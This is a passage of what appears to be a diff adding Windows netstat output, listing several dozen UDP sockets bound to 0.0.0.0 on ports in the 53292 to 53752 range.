+682	  UDP    0.0.0.0:53292          *:*	
+683	  UDP    0.0.0.0:53297          *:*	
+684	  UDP    0.0.0.0:53302          *:*	
+685	  UDP    0.0.0.0:53308          *:*	
+686	  UDP    0.0.0.0:53313          *:*	
+687	  UDP    0.0.0.0:53327          *:*	
+688	  UDP    0.0.0.0:53330          *:*	
+689	  UDP    0.0.0.0:53337          *:*	
+690	  UDP    0.0.0.0:53363          *:*	
+691	  UDP    0.0.0.0:53366          *:*	
+692	  UDP    0.0.0.0:53367          *:*	
+693	  UDP    0.0.0.0:53370          *:*	
+694	  UDP    0.0.0.0:53371          *:*	
+695	  UDP    0.0.0.0:53376          *:*	
+696	  UDP    0.0.0.0:53397          *:*	
+697	  UDP    0.0.0.0:53401          *:*	
+698	  UDP    0.0.0.0:53402          *:*	
+699	  UDP    0.0.0.0:53404          *:*	
+700	  UDP    0.0.0.0:53412          *:*	
+701	  UDP    0.0.0.0:53413          *:*	
+702	  UDP    0.0.0.0:53414          *:*	
+703	  UDP    0.0.0.0:53415          *:*	
+704	  UDP    0.0.0.0:53420          *:*	
+705	  UDP    0.0.0.0:53437          *:*	
+706	  UDP    0.0.0.0:53439          *:*	
+707	  UDP    0.0.0.0:53443          *:*	
+708	  UDP    0.0.0.0:53444          *:*	
+709	  UDP    0.0.0.0:53464          *:*	
+710	  UDP    0.0.0.0:53471          *:*	
+711	  UDP    0.0.0.0:53477          *:*	
+712	  UDP    0.0.0.0:53478          *:*	
+713	  UDP    0.0.0.0:53479          *:*	
+714	  UDP    0.0.0.0:53481          *:*	
+715	  UDP    0.0.0.0:53523          *:*	
+716	  UDP    0.0.0.0:53531          *:*	
+717	  UDP    0.0.0.0:53532          *:*	
+718	  UDP    0.0.0.0:53539          *:*	
+719	  UDP    0.0.0.0:53545          *:*	
+720	  UDP    0.0.0.0:53547          *:*	
+721	  UDP    0.0.0.0:53548          *:*	
+722	  UDP    0.0.0.0:53549          *:*	
+723	  UDP    0.0.0.0:53550          *:*	
+724	  UDP    0.0.0.0:53551          *:*	
+725	  UDP    0.0.0.0:53557          *:*	
+726	  UDP    0.0.0.0:53561          *:*	
+727	  UDP    0.0.0.0:53575          *:*	
+728	  UDP    0.0.0.0:53578          *:*	
+729	  UDP    0.0.0.0:53582          *:*	
+730	  UDP    0.0.0.0:53594          *:*	
+731	  UDP    0.0.0.0:53598          *:*	
+732	  UDP    0.0.0.0:53602          *:*	
+733	  UDP    0.0.0.0:53617          *:*	
+734	  UDP    0.0.0.0:53630          *:*	
+735	  UDP    0.0.0.0:53647          *:*	
+736	  UDP    0.0.0.0:53648          *:*	
+737	  UDP    0.0.0.0:53653          *:*	
+738	  UDP    0.0.0.0:53658          *:*	
+739	  UDP    0.0.0.0:53659          *:*	
+740	  UDP    0.0.0.0:53669          *:*	
+741	  UDP    0.0.0.0:53683          *:*	
+742	  UDP    0.0.0.0:53687          *:*	
+743	  UDP    0.0.0.0:53692          *:*	
+744	  UDP    0.0.0.0:53694          *:*	
+745	  UDP    0.0.0.0:53705          *:*	
+746	  UDP    0.0.0.0:53706          *:*	
+747	  UDP    0.0.0.0:53707          *:*	
+748	  UDP    0.0.0.0:53710          *:*	
+749	  UDP    0.0.0.0:53711          *:*	
+750	  UDP    0.0.0.0:53712          *:*	
+751	  UDP    0.0.0.0:53752          *:*	
